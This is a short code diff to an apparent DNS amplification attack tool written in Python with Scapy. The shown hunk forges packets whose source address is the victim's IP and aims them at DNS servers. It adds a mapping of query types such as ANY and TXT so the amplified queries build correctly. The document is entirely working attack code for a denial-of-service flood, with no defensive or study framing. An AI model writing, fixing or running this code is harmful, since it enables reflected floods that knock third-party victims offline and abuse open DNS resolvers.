@@ -207,7 +207,9 @@ class DNSAmplificationAttack:
         # Create the packet layers
         ip_layer = IP(dst=dns_server, src=self.target_ip)
         udp_layer = UDP(dport=self.DNS_PORT, sport=random.randint(1024, 65535))
-        dns_layer = DNS(id=dns_id, qd=DNSQR(qname=self.domain, qtype=self.query_type))
+        qtype_map = {"ANY": 255, "TXT": 16, "MX": 15, "NS": 2, "A": 1, "SRV": 33}
+        qtype_val = qtype_map.get(self.query_type, self.query_type)
+        dns_layer = DNS(id=dns_id, qd=DNSQR(qname=self.domain, qtype=qtype_val))
 
         # Combine layers
         packet = ip_layer / udp_layer / dns_layer
